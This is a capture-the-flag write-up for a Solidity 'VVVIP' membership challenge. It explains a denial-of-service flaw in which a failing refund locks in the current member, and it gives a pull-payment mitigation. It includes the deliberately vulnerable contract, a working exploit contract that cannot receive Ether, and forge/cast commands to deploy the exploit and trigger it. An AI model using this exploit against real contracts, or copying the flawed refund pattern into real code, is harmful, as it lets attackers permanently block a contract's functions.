## Mitigation 

In the lab you've just done, you know that you can become the FOREVER VVVIP Member by making a smart contract that couldn't receive any Ether in order to make the refund fail, but know we are going to learn how to mitigate such vulnerability. The vulnerability lies in here. &nbsp;  
&nbsp;  

```solidity
function becomeVVVVIP() external payable{
    require(msg.value > currentBalance, "You don't have enough money to become VVVIP!");
    (bool refund, ) = currentVVVIP.call{value: currentBalance}(""); 
    require(refund, "The fund is not given back!");
    if(currentVVVIP == address(0)){
        currentVVVIP = msg.sender;
        currentBalance = msg.value;
    }
    currentVVVIP = msg.sender;
    currentBalance = msg.value;
}
```
&nbsp;  
The easiest mitigation that we can implement here is just not to immediately send the balance if one position is taken by another—by calling this function with higher Ether, what we can do is make a mapping for each balance and a withdraw function to make allow pass VVVIP to withdraw their own balance, so the mitigated contract would look like this. &nbsp;  
&nbsp;  

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

contract VVVIP{
    address private currentVVVIP;
    uint256 private currentBalance;
    mapping(address => uint256) public balances;

    function becomeVVVVIP() external payable{
        balances[msg.sender] += msg.value;
        require(balances[msg.sender] > currentBalance, "You don't have enough money to become VVVIP!");
        currentVVVIP = msg.sender;
        currentBalance = balances[msg.sender];
    }

    function withdraw() public{
        require(msg.sender != currentVVVIP, "VVVIP Cannot withdraw balance!");
        uint256 toWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: toWithdraw}("");
        require(sent, "Withdrawal failed!");
    }


    function getVVVVIP() public view returns(address, uint256){
        return (currentVVVIP, currentBalance);
    }

}
```
&nbsp;  
If you want to try your previous exploit against this new mitigated contract, you need to change the *Setup.sol::TryIfSolve()* to the one like below to ensure that the function tries to become VVVIP again. &nbsp;  
&nbsp;  

```solidity
   function TryIfSolve() public payable {
        vvvip.becomeVVVVIP{value: 10 ether}();
    }
```
&nbsp;  
Although most developers take their time and put in much effort to ensure that logic, calculation, and interactions are functioning as intended, some times there will be an unexpected behavior that they may not realize, that often leads to something like DoS.

## Walkthrough 

Becoming a VVVIP member always has the downside, like how easily you can be replaced by others, but what if we can make ourselves forever a VVVIP member? That's the task that we are going to tackle in this challenge; the *isSolved()* condition, as seen below, is quite unique. &nbsp;  
&nbsp;  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./VVVIP.sol";

contract Setup{
    VVVIP public immutable vvvip;
    bool public solved;

    constructor() payable {
        require(msg.value == 15 ether);
        vvvip = new VVVIP();
        vvvip.becomeVVVVIP{value: 3 ether}();
    }

    function TryIfSolve() public payable {
        try vvvip.becomeVVVVIP{value: 10 ether}() {
            (address amIVVVVIP, ) = vvvip.getVVVVIP();
            require(amIVVVVIP != address(this), "You are still VVVIP member!");
            solved = false;
        } catch {
            solved = true;
        }
    }

    function isSolved() public view returns(bool){
        return solved;
    }

    receive() external payable{}

}
```
&nbsp;  
Initially, the Setup Contract is the current VVVIP Member with 3 Ether worth, but there is a function *TryIfSolve()*; this function will run in order to change the *solved()* value. If the Setup succeeds to reclaim his Membership, then we are going to receive our money back and we lost our VVVIP Member status, but if we check our balance using this command &nbsp;  
&nbsp;  
```bash
cast balance -r $RPC_URL $WALLET_ADDR
```
&nbsp;  
Turns out we only have 7 Ether, so how come we can hold our status as the VVVIP Member if the setup is going to reclaim it with 7 Ether? Let's see the VVVIP contract first. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract VVVIP{
    address private currentVVVIP;
    uint256 private currentBalance;

    function becomeVVVVIP() external payable{
        require(msg.value > currentBalance, "You don't have enough money to become VVVIP!");
        (bool refund, ) = currentVVVIP.call{value: currentBalance}(""); 
        require(refund, "The fund is not given back!");
        if(currentVVVIP == address(0)){
            currentVVVIP = msg.sender;
            currentBalance = msg.value;
        }
        currentVVVIP = msg.sender;
        currentBalance = msg.value;
    }

    function getVVVVIP() public view returns(address, uint256){
        return (currentVVVIP, currentBalance);
    }

}
```
&nbsp;  
There we can see the logic, so the first person to interact with it will automatically become the VVVIP Member, which is the Setup with 3 Ether worth. When someone tries to challenge the VVVIP Member, if the Ether sent to challenge is less than the current VVVIP Member worth, it will revert; otherwise,  it will refund the worth of the previous VVVIP Member and set the new VVVIP Member alongside the Ether worth. &nbsp;  
&nbsp;  
The logic there seems flawless, but what if I told you we don't have to be the ones to interact with it? We can just create an exploit contract that has no way of receiving Ether. Why would this work? Since the way of refund is required to be successful, if we just make it fail every time, our VVVIP Member status won't be revoked, so here is the exploit contract. &nbsp;  
&nbsp;  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./VVVIP.sol";
import "./Setup.sol";

contract Exploit{
    Setup public setup;
    VVVIP public vvvip;

    constructor(address payable _setup) payable{
        require(msg.value == 4 ether);
        setup = Setup(_setup);
        vvvip = VVVIP(setup.vvvip());
    }

    function exploit() public {
        vvvip.becomeVVVVIP{value: 4 ether }();
    }

}
```
&nbsp;  
We just need to deploy it and give it 4 Ether to work. &nbsp;  
&nbsp;  
```bash
// Deploying the Exploit Contract
forge create src/vvvip-member/$EXPLOIT_FILE:$EXPLOIT_NAME -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR --value 4ether

// Interacting with the Exploit
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "exploit()"
```
&nbsp;  
Running the command above and making the exploit contract become the forever VVVIP member will solve the challenge!